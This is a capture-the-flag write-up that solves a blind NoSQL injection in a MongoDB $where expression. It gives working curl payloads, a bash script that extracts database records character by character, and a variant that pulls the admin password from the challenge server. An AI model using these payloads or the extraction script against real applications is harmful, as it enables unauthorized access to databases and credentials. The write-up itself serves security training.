#### NoSQL injection on MongoDB

> MojoJojo has obtained some secret information about the identities of our three favourite little ladies. We only know that he manages this site: http://challenges.ka0labs.org:31337, but we couldn't find anything. We need your help to get access!!?

When we visit the url we find the following:

<img alt="Main page" src="https://raw.githubusercontent.com/ka0labs/ctf-writeups/master/2016/nn6ed/imgs/mongojojo-1.png">

Looking into the source code we can see a couple of things:

```html
<!-- It's nice to design listening to your favourite song :)) https://youtu.be/UbA8TFYY-KY?t=4m54s -->
```

And the 3 images:

```html
<img src="/avatar/Q2FjdHVz">
<img src="/avatar/UGV0YWxv">
<img src="/avatar/QnVyYnVqYQ==">
```

Doing a quick check we see that these endpoints get a base64 string and cause a redirect to static files:

```bash
$ curl -I http://challenges.ka0labs.org:31337/avatar/Q2FjdHVz
HTTP/1.1 302 Found
Server: nginx
Date: Thu, 06 Oct 2016 13:13:32 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 38
Connection: keep-alive
Location: /imgs/cactus.png
Vary: Accept
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
max_ranges: 0
```

Or, when modified:

```bash
$ curl -I "http://challenges.ka0labs.org:31337/avatar/$(echo -ne test | base64)"
HTTP/1.1 302 Found
Server: nginx
Date: Thu, 06 Oct 2016 13:16:21 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 37
Connection: keep-alive
Location: /imgs/undefined
Vary: Accept
X-Frame-Options: SAMEORIGIN
X-XSS-Protection: 1; mode=block
max_ranges: 0
```

This `undefined` should ring a bell, since is very common on Javascript. We also see that some special chars or words, like single quotes, cause an error:

```bash
$ curl -I "http://challenges.ka0labs.org:31337/avatar/$(echo -ne \' | base64)"
HTTP/1.1 500 Internal Server Error
Server: nginx
Date: Thu, 06 Oct 2016 13:19:13 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 20
Connection: keep-alive
ETag: W/"14-T/08Zi7QtXFVEDkd9P0Srw"
```

With the title of the challenge we can guess that it's about a NoSQL injection, so we try to get a true/false response.

True:

```bash
$ curl -s -I "http://challenges.ka0labs.org:31337/avatar/$(echo -ne 'Cactus"&&(true)||"' | base64)" | grep Location
Location: /imgs/cactus.png
```

False:

```bash
$ curl -s -I "http://challenges.ka0labs.org:31337/avatar/$(echo -ne 'Cactus"&&(false)||"' | base64)" | grep Location
Location: /imgs/undefined
```

Ok, it's a blind injection, so the first attempt is try to enumerate the collections in the database: `db.getCollectionNames()`. Unfortunately, any access to the `db` object does not seem to work.

At this point some hints were released:

> $where is my mind? https://www.youtube.com/watch?v=yFAnn2j4iB0
> RTFM: https://docs.mongodb.com/manual/reference/operator/query/where/

Now it should be obvious that the injection is inside a `$where` expression, for that reason we didn't have access to most objects. We had 2 options: guess the collection structure (was possible since the parameters were `username` and `password`, most users followed this way), read the documentation and use some of the allowed methods.

Our expected solution uses `tojsononeline` and the regexp's `match` method. 

```bash
$ curl -s -I "http://challenges.ka0labs.org:31337/avatar/$(echo -ne 'Cactus"&&(tojsononeline(this).match(/^.*$/))||"' | base64)" | grep Location
Location: /imgs/cactus.png
```

The object `this` in a `$where` expression points to the document being queried each time inside the current collection. So we only need to automatize the process :D

```bash
#!/bin/bash

URL="http://challenges.ka0labs.org:31337/avatar/"
injection=''

while true; do
    echo "Try '$injection'"
    for c in {'{','}','\s',',',':','_','!','@','"','\[','\]','\(','\)','\.',{a..z},{0..9},{A..Z}}; do
        res="$(curl -s -I "${URL}$(echo -ne "Cactus\"&&tojsononeline(this).match(/^${injection}${c}(.*)$/)||\"" | base64 | tr -d '\n')")"
        echo "$res" | grep -q "Location: /imgs/.*.png"
        if [ $? -eq 0 ]; then
            echo "Match '$c'"
            injection="$injection$c"
            break
        fi
    done
done
```

After test and error (special chars may give problems), and soooome time (using threads would have been nice) we get the following structure:

`{\s\s"_id"\s:\sObjectId\("57d6bc5c27913d21a0bbad44"\),\s\s"user"\s:\s"Cactus",\s\s"password"\s:\s"CuidadoQueQuemo",\s\s"avatar"\s:\s"cactus\.png",\s\s"admin"\s:\s"NO"\s}`

Since we want the administrator, we have to change our injection a little to: `"||this.admin=="YES"&&tojsononeline(this).match(/^(.*)/$)||"`. So we finally get:

`{\s\s"_id"\s:\sObjectId\("57d6bc3c27913d21a0bbad41"\),\s\s"user"\s:\s"MojoJojo",\s\s"password"\s:\s"bubbles{Ih4t3Sup3RG1rrrlz}",\s\s"avatar"\s:\s"mojo\.png",\s\s"admin"\s:\s"YES"\s}`

And the flag!!

#### bubbles{Ih4t3Sup3RG1rrrlz}

## Phase 2 (80 pts)

#### Escape JS sandbox mutating objects

Once we have obtained the user and password, we can login (it was easy to figure out the `/admin` panel) and we find a rare shell names `MoJS`.
